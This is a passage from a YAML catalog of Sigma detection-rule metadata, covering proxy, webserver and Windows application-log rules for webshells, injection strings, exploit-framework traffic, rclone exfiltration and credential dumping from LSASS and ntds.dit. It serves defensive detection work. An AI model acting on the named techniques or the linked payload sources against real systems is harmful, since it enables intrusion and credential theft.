  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1071.001
  - T1197
  tags:
  - attack.command-and-control
  - attack.t1071.001
  - attack.defense-evasion
  - attack.persistence
  - attack.t1197
  - attack.s0190
  time_window: ''
  references:
  - https://twitter.com/jhencinski/status/1102695118455349248
  - https://isc.sans.edu/forums/diary/Investigating+Microsoft+BITS+Activity/23281/
  false_positives:
  - Rare programs that use Bitsadmin and update from regional TLDs e.g. .uk or .ca
  notes: ''
- detection_id: fa935401-513b-467b-81f4-f9e77aa0dd78
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/proxy_generic/proxy_ua_cryptominer.yml
  name: Crypto Miner User Agent
  description: Detects suspicious user agent strings used by crypto miners in proxy
    logs
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques:
  - T1071.001
  tags:
  - attack.command-and-control
  - attack.t1071.001
  time_window: ''
  references:
  - https://github.com/xmrig/xmrig/blob/da22b3e6c45825f3ac1f208255126cb8585cd4fc/src/base/kernel/Platform_win.cpp#L65
  - https://github.com/xmrig/xmrig/blob/427b6516e0550200c17ca28675118f0fffcc323f/src/version.h
  false_positives:
  - Unknown
  notes: ''
- detection_id: 21e44d78-95e7-421b-a464-ffd8395659c4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/proxy_generic/proxy_ua_empty.yml
  name: HTTP Request With Empty User Agent
  description: 'Detects a potentially suspicious empty user agent strings in proxy
    log.

    Could potentially indicate an uncommon request method.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques:
  - T1071.001
  tags:
  - attack.defense-evasion
  - attack.command-and-control
  - attack.t1071.001
  time_window: ''
  references:
  - https://twitter.com/Carlos_Perez/status/883455096645931008
  false_positives:
  - Unknown
  notes: ''
- detection_id: fdd1bfb5-f60b-4a35-910e-f36ed3d0b32f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/proxy_generic/proxy_ua_frameworks.yml
  name: Exploit Framework User Agent
  description: Detects suspicious user agent strings used by exploit / pentest frameworks
    like Metasploit in proxy logs
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques:
  - T1071.001
  tags:
  - attack.command-and-control
  - attack.t1071.001
  time_window: ''
  references:
  - https://blog.didierstevens.com/2015/03/16/quickpost-metasploit-user-agent-strings/
  false_positives:
  - Unknown
  notes: ''
- detection_id: c42a3073-30fb-48ae-8c99-c23ada84b103
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/proxy_generic/proxy_ua_hacktool.yml
  name: Hack Tool User Agent
  description: Detects suspicious user agent strings user by hack tools in proxy logs
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques:
  - T1110
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - attack.credential-access
  - attack.t1110
  time_window: ''
  references:
  - https://github.com/fastly/waf_testbed/blob/8bfc406551f3045e418cbaad7596cff8da331dfc/templates/default/scanners-user-agents.data.erb
  - http://rules.emergingthreats.net/open/snort-2.9.0/rules/emerging-user_agents.rules
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5c84856b-55a5-45f1-826f-13f37250cf4e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/proxy_generic/proxy_ua_malware.yml
  name: Malware User Agent
  description: Detects suspicious user agent strings used by malware in proxy logs
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques:
  - T1071.001
  tags:
  - attack.command-and-control
  - attack.t1071.001
  time_window: ''
  references:
  - http://rules.emergingthreats.net/open/snort-2.9.0/rules/emerging-user_agents.rules
  - http://www.botopedia.org/search?searchword=scan&searchphrase=all
  - https://networkraptor.blogspot.com/2015/01/user-agent-strings.html
  - https://perishablepress.com/blacklist/ua-2013.txt
  - https://www.bluecoat.com/en-gb/security-blog/2015-05-05/know-your-agents
  - https://twitter.com/kladblokje_88/status/1614673320124743681?s=12&t=joEpeVa5d58aHYNGA_To7Q
  - https://pbs.twimg.com/media/FtYbfsDXoAQ1Y8M?format=jpg&name=large
  - https://twitter.com/crep1x/status/1635034100213112833
  false_positives:
  - Unknown
  notes: ''
- detection_id: c8557060-9221-4448-8794-96320e6f3e74
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/proxy_generic/proxy_ua_powershell.yml
  name: Windows PowerShell User Agent
  description: Detects Windows PowerShell Web Access
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques:
  - T1071.001
  tags:
  - attack.defense-evasion
  - attack.command-and-control
  - attack.t1071.001
  time_window: ''
  references:
  - https://msdn.microsoft.com/powershell/reference/5.1/microsoft.powershell.utility/Invoke-WebRequest
  false_positives:
  - Administrative scripts that download files from the Internet
  - Administrative scripts that retrieve certain website contents
  notes: ''
- detection_id: 2c03648b-e081-41a5-b9fb-7d854a915091
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/proxy_generic/proxy_ua_rclone.yml
  name: Rclone Activity via Proxy
  description: Detects the use of rclone, a command-line program to manage files on
    cloud storage, via its default user-agent string
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1567.002
  tags:
  - attack.exfiltration
  - attack.t1567.002
  time_window: ''
  references:
  - https://rclone.org/
  - https://www.kroll.com/en/insights/publications/cyber/new-m365-business-email-compromise-attacks-with-rclone
  false_positives:
  - Valid requests with this exact user agent to that is used by legitimate scripts
    or sysadmin operations
  notes: ''
- detection_id: 7195a772-4b3f-43a4-a210-6a003d65caa1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/proxy_generic/proxy_ua_susp.yml
  name: Suspicious User Agent
  description: Detects suspicious malformed user agent strings in proxy logs
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques:
  - T1071.001
  tags:
  - attack.command-and-control
  - attack.t1071.001
  time_window: ''
  references:
  - https://github.com/fastly/waf_testbed/blob/8bfc406551f3045e418cbaad7596cff8da331dfc/templates/default/scanners-user-agents.data.erb
  false_positives:
  - Unknown
  notes: ''
- detection_id: 894a8613-cf12-48b3-8e57-9085f54aa0c3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/proxy_generic/proxy_ua_susp_base64.yml
  name: Potential Base64 Encoded User-Agent
  description: Detects User Agent strings that end with an equal sign, which can be
    a sign of base64 encoding.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques:
  - T1071.001
  tags:
  - attack.command-and-control
  - attack.t1071.001
  time_window: ''
  references:
  - https://blogs.jpcert.or.jp/en/2022/07/yamabot.html
  - https://deviceatlas.com/blog/list-of-user-agent-strings#desktop
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1ae64f96-72b6-48b3-ad3d-e71dff6c6398
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/proxy_generic/proxy_webdav_external_execution.yml
  name: Suspicious External WebDAV Execution
  description: 'Detects executables launched from external WebDAV shares using the
    WebDAV Explorer integration, commonly seen in initial access campaigns.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques:
  - T1566
  - T1584
  tags:
  - attack.initial-access
  - attack.resource-development
  - attack.t1584
  - attack.t1566
  time_window: ''
  references:
  - https://dear-territory-023.notion.site/WebDav-Share-Testing-e4950fa0c00149c3aa430d779b9b1d0f?pvs=4
  - https://micahbabinski.medium.com/search-ms-webdav-and-chill-99c5b23ac462
  - https://www.trendmicro.com/en_no/research/24/b/cve202421412-water-hydra-targets-traders-with-windows-defender-s.html
  - https://www.trellix.com/en-us/about/newsroom/stories/research/beyond-file-search-a-novel-method.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 85254a62-22be-4239-b79c-2ec17e566c37
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/webserver_generic/web_f5_tm_utility_bash_api_request.yml
  name: F5 BIG-IP iControl Rest API Command Execution - Webserver
  description: Detects POST requests to the F5 BIG-IP iControl Rest API "bash" endpoint,
    which allows the execution of commands on the BIG-IP
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1190
  tags:
  - attack.execution
  - attack.t1190
  - attack.initial-access
  time_window: ''
  references:
  - https://f5-sdk.readthedocs.io/en/latest/apidoc/f5.bigip.tm.util.html#module-f5.bigip.tm.util.bash
  - https://community.f5.com/t5/technical-forum/icontrolrest-11-5-execute-bash-command/td-p/203029
  - https://community.f5.com/t5/technical-forum/running-bash-commands-via-rest-api/td-p/272516
  false_positives:
  - Legitimate usage of the BIG IP REST API to execute command for administration
    purposes
  notes: ''
- detection_id: 7cb02516-6d95-4ffc-8eee-162075e111ac
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/webserver_generic/web_iis_tilt_shortname_scan.yml
  name: Successful IIS Shortname Fuzzing Scan
  description: When IIS uses an old .Net Framework it's possible to enumerate folders
    with the symbol "~"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  time_window: ''
  references:
  - https://github.com/projectdiscovery/nuclei-templates/blob/9d2889356eebba661c8407038e430759dfd4ec31/fuzzing/iis-shortname.yaml
  - https://www.exploit-db.com/exploits/19525
  - https://github.com/lijiejie/IIS_shortname_Scanner
  false_positives:
  - Unknown
  notes: ''
- detection_id: 583aa0a2-30b1-4d62-8bf3-ab73689efe6c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/webserver_generic/web_java_payload_in_access_logs.yml
  name: Java Payload Strings
  description: Detects possible Java payloads in web access logs
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - cve.2022-26134
  - cve.2021-26084
  - attack.initial-access
  - attack.t1190
  time_window: ''
  references:
  - https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/
  - https://www.rapid7.com/blog/post/2021/09/02/active-exploitation-of-confluence-server-cve-2021-26084/
  - https://github.com/httpvoid/writeups/blob/62d3751945289d088ccfdf4d0ffbf61598a2cd7d/Confluence-RCE.md
  - https://twitter.com/httpvoid0x2f/status/1532924261035384832
  - https://medium.com/geekculture/text4shell-exploit-walkthrough-ebc02a01f035
  false_positives:
  - Legitimate apps
  notes: ''
- detection_id: 412d55bc-7737-4d25-9542-5b396867ce55
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/webserver_generic/web_jndi_exploit.yml
  name: JNDIExploit Pattern
  description: Detects exploitation attempt using the JNDI-Exploit-Kit
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  time_window: ''
  references:
  - https://github.com/pimps/JNDI-Exploit-Kit
  - https://web.archive.org/web/20231015205935/https://githubmemory.com/repo/FunctFan/JNDIExploit
  false_positives:
  - Legitimate apps the use these paths
  notes: ''
- detection_id: 7745c2ea-24a5-4290-b680-04359cb84b35
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/webserver_generic/web_path_traversal_exploitation_attempt.yml
  name: Path Traversal Exploitation Attempts
  description: Detects path traversal exploitation attempts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  time_window: ''
  references:
  - https://github.com/projectdiscovery/nuclei-templates
  - https://book.hacktricks.xyz/pentesting-web/file-inclusion
  false_positives:
  - Expected to be continuously seen on systems exposed to the Internet
  - Internal vulnerability scanners
  notes: ''
- detection_id: 953d460b-f810-420a-97a2-cfca4c98e602
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/webserver_generic/web_source_code_enumeration.yml
  name: Source Code Enumeration Detection by Keyword
  description: Detects source code enumeration that use GET requests by keyword searches
    in URL strings
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1083
  tags:
  - attack.discovery
  - attack.t1083
  time_window: ''
  references:
  - https://pentester.land/tutorials/2018/10/25/source-code-disclosure-via-exposed-git-folder.html
  - https://medium.com/@logicbomb_1/bugbounty-how-i-was-able-to-download-the-source-code-of-indias-largest-telecom-service-52cf5c5640a1
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5513deaf-f49a-46c2-a6c8-3f111b5cb453
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/webserver_generic/web_sql_injection_in_access_logs.yml
  name: SQL Injection Strings In URI
  description: Detects potential SQL injection attempts via GET requests in access
    logs.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  time_window: ''
  references:
  - https://www.acunetix.com/blog/articles/exploiting-sql-injection-example/
  - https://www.acunetix.com/blog/articles/using-logs-to-investigate-a-web-application-attack/
  - https://brightsec.com/blog/sql-injection-payloads/
  - https://github.com/payloadbox/sql-injection-payload-list
  - https://book.hacktricks.xyz/pentesting-web/sql-injection/mysql-injection
  false_positives:
  - Java scripts and CSS Files
  - User searches in search boxes of the respective website
  - Internal vulnerability scanners can cause some serious FPs when used, if you experience
    a lot of FPs due to this think of adding more filters such as "User Agent" strings
    and more response codes
  notes: ''
- detection_id: ada3bc4f-f0fd-42b9-ba91-e105e8af7342
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/webserver_generic/web_ssti_in_access_logs.yml
  name: Server Side Template Injection Strings
  description: Detects SSTI attempts sent via GET requests in access logs
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1221
  tags:
  - attack.defense-evasion
  - attack.t1221
  time_window: ''
  references:
  - https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
  - https://github.com/payloadbox/ssti-payloads
  false_positives:
  - User searches in search boxes of the respective website
  - Internal vulnerability scanners can cause some serious FPs when used, if you experience
    a lot of FPs due to this think of adding more filters such as "User Agent" strings
    and more response codes
  notes: ''
- detection_id: 19aa4f58-94ca-45ff-bc34-92e533c0994a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/webserver_generic/web_susp_useragents.yml
  name: Suspicious User-Agents Related To Recon Tools
  description: Detects known suspicious (default) user-agents related to scanning/recon
    tools
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  time_window: ''
  references:
  - https://github.com/wpscanteam/wpscan/blob/196fbab5b1ce3870a43515153d4f07878a89d410/lib/wpscan/browser.rb
  - https://github.com/xmendez/wfuzz/blob/1b695ee9a87d66a7d7bf6cae70d60a33fae51541/docs/user/basicusage.rst
  - https://github.com/lanmaster53/recon-ng/blob/9e907dfe09fce2997f0301d746796408e01a60b7/recon/core/base.py#L92
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9f6a34b4-2688-4eb7-a7f5-e39fef573d0e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/webserver_generic/web_susp_windows_path_uri.yml
  name: Suspicious Windows Strings In URI
  description: Detects suspicious Windows strings in URI which could indicate possible
    exfiltration or webshell communication
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics:
  - Exfiltration
  - Persistence
  techniques:
  - T1505.003
  tags:
  - attack.persistence
  - attack.exfiltration
  - attack.t1505.003
  time_window: ''
  references:
  - https://thedfirreport.com/2022/06/06/will-the-real-msiexec-please-stand-up-exploit-leads-to-data-exfiltration/
  false_positives:
  - Legitimate application and websites that use windows paths in their URL
  notes: ''
- detection_id: 2ea44a60-cfda-11ea-87d0-0242ac130003
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/webserver_generic/web_webshell_regeorg.yml
  name: Webshell ReGeorg Detection Via Web Logs
  description: Certain strings in the uri_query field when combined with null referer
    and null user agent can indicate activity associated with the webshell ReGeorg.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - multi_signal_correlation
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1505.003
  tags:
  - attack.persistence
  - attack.t1505.003
  time_window: ''
  references:
  - https://community.rsa.com/community/products/netwitness/blog/2019/02/19/web-shells-and-netwitness-part-3
  - https://github.com/sensepost/reGeorg
  false_positives:
  - Web applications that use the same URL parameters as ReGeorg
  notes: ''
- detection_id: 7ff9db12-1b94-4a79-ba68-a2402c5d6729
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/webserver_generic/web_win_webshells_in_access_logs.yml
  name: Windows Webshell Strings
  description: Detects common commands used in Windows webshells
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1505.003
  tags:
  - attack.persistence
  - attack.t1505.003
  time_window: ''
  references:
  - https://bad-jubies.github.io/RCE-NOW-WHAT/
  - https://m365internals.com/2022/10/07/hunting-in-on-premises-exchange-server-logs/
  false_positives:
  - Web sites like wikis with articles on os commands and pages that include the os
    commands in the URLs
  - User searches in search boxes of the respective website
  notes: ''
- detection_id: 65354b83-a2ea-4ea6-8414-3ab38be0d409
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/webserver_generic/web_xss_in_access_logs.yml
  name: Cross Site Scripting Strings
  description: Detects XSS attempts injected via GET requests in access logs
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1189
  tags:
  - attack.initial-access
  - attack.t1189
  time_window: ''
  references:
  - https://github.com/payloadbox/xss-payload-list
  - https://portswigger.net/web-security/cross-site-scripting/contexts
  false_positives:
  - JavaScripts,CSS Files and PNG files
  - User searches in search boxes of the respective website
  - Internal vulnerability scanners can cause some serious FPs when used, if you experience
    a lot of FPs due to this think of adding more filters such as "User Agent" strings
    and more response codes
  notes: ''
- detection_id: 78bc5783-81d9-4d73-ac97-59f6db4f72a8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/application/Other/win_av_relevant_match.yml
  name: Relevant Anti-Virus Signature Keywords In Application Log
  description: 'Detects potentially highly relevant antivirus events in the application
    log based on known virus signature names and malware keywords.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: application
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1588
  tags:
  - attack.resource-development
  - attack.t1588
  time_window: ''
  references:
  - https://www.virustotal.com/gui/file/13828b390d5f58b002e808c2c4f02fdd920e236cc8015480fa33b6c1a9300e31
  - https://www.virustotal.com/gui/file/15b57c1b68cd6ce3c161042e0f3be9f32d78151fe95461eedc59a79fc222c7ed
  - https://www.virustotal.com/gui/file/5092b2672b4cb87a8dd1c2e6047b487b95995ad8ed5e9fc217f46b8bfb1b8c01
  - https://www.nextron-systems.com/?s=antivirus
  false_positives:
  - Some software piracy tools (key generators, cracks) are classified as hack tools
  notes: ''
- detection_id: a18e0862-127b-43ca-be12-1a542c75c7c5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/application/application_error/win_application_error_lsass_crash.yml
  name: LSASS Process Crashed - Application
  description: 'Detects Windows error reporting events where the process that crashed
    is LSASS (Local Security Authority Subsystem Service).

    This could be the cause of a provoked crash by techniques such as Lsass-Shtinkering
    to dump credentials.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: application
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://github.com/deepinstinct/Lsass-Shtinkering
  - https://media.defcon.org/DEF%20CON%2030/DEF%20CON%2030%20presentations/Asaf%20Gilboa%20-%20LSASS%20Shtinkering%20Abusing%20Windows%20Error%20Reporting%20to%20Dump%20LSASS.pdf
  - https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55
  false_positives:
  - Rare legitimate crashing of the lsass process
  notes: ''
- detection_id: 545a5da6-f103-4919-a519-e9aec1026ee4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/application/application_error/win_application_error_msmpeng_crash.yml
  name: Microsoft Malware Protection Engine Crash
  description: This rule detects a suspicious crash of the Microsoft Malware Protection
    Engine
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: application
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1211
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1211
  - attack.t1562.001
  time_window: ''
  references:
  - https://bugs.chromium.org/p/project-zero/issues/detail?id=1252&desc=5
  - https://technet.microsoft.com/en-us/library/security/4022344
  false_positives:
  - MsMpEng might crash if the "C:\" partition is full
  notes: ''
- detection_id: e6e88853-5f20-4c4a-8d26-cd469fd8d31f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/application/esent/win_esent_ntdsutil_abuse.yml
  name: Ntdsutil Abuse
  description: Detects potential abuse of ntdsutil to dump ntds.dit database
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: application
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1003.003
  tags:
  - attack.credential-access
  - attack.t1003.003
  time_window: ''
  references:
  - https://twitter.com/mgreen27/status/1558223256704122882
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/jj574207(v=ws.11)
  false_positives:
  - Legitimate backup operation/creating shadow copies
  notes: ''
- detection_id: 94dc4390-6b7c-4784-8ffc-335334404650
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/application/esent/win_esent_ntdsutil_abuse_susp_location.yml
  name: Dump Ntds.dit To Suspicious Location
  description: Detects potential abuse of ntdsutil to dump ntds.dit database to a
    suspicious location
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: application
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://twitter.com/mgreen27/status/1558223256704122882
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/jj574207(v=ws.11)
  false_positives:
  - Legitimate backup operation/creating shadow copies
  notes: ''
- detection_id: 48d91a3a-2363-43ba-a456-ca71ac3da5c2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/application/microsoft-windows_audit_cve/win_audit_cve.yml
  name: Audit CVE Event
  description: 'Detects events generated by user-mode applications when they call
    the CveEventWrite API when a known vulnerability is trying to be exploited.

    MS started using this log in Jan. 2020 with CVE-2020-0601 (a Windows CryptoAPI
    vulnerability.

    Unfortunately, that is about the only instance of CVEs being written to this log.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: application
  category: ''
  data_sources: []
  tactics:
  - Execution
  - Impact
  techniques:
  - T1068
  - T1203
  - T1210
  - T1211
  - T1212
  - T1499.004
  tags:
  - attack.execution
  - attack.t1203
  - attack.privilege-escalation
  - attack.t1068
  - attack.defense-evasion
  - attack.t1211
  - attack.credential-access
  - attack.t1212
  - attack.lateral-movement
  - attack.t1210
  - attack.impact
  - attack.t1499.004
  time_window: ''
  references:
  - https://twitter.com/VM_vivisector/status/1217190929330655232
  - https://twitter.com/DidierStevens/status/1217533958096924676
  - https://twitter.com/FlemmingRiis/status/1217147415482060800
  - https://www.youtube.com/watch?v=ebmW42YYveI
  - https://nullsec.us/windows-event-log-audit-cve/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9703792d-fd9a-456d-a672-ff92efe4806a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/application/microsoft_windows_backup/win_susp_backup_delete.yml
  name: Backup Catalog Deleted
  description: Detects backup catalog deletions
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: application
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1070.004
  tags:
  - attack.defense-evasion
  - attack.t1070.004
  time_window: ''
  references:
  - https://technet.microsoft.com/en-us/library/cc742154(v=ws.11).aspx
  - https://www.hybrid-analysis.com/sample/ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa?environmentId=100
  false_positives:
  - Unknown
  notes: ''
- detection_id: b4c8da4a-1c12-46b0-8a2b-0a8521d03442
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/application/microsoft_windows_software_restriction_policies/win_software_restriction_policies_block.yml
  name: Restricted Software Access By SRP
  description: Detects restricted access to applications by the Software Restriction
    Policies (SRP) policy
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: application
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1072
  tags:
  - attack.lateral-movement
  - attack.execution
  - attack.defense-evasion
  - attack.t1072
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows-server/identity/software-restriction-policies/software-restriction-policies
  - https://github.com/nasbench/EVTX-ETW-Resources/blob/7a806a148b3d9d381193d4a80356016e6e8b1ee8/ETWEventsList/CSV/Windows11/22H2/W11_22H2_Pro_20220920_22621.382/Providers/Microsoft-Windows-AppXDeployment-Server.csv
  false_positives:
  - Unknown
  notes: ''
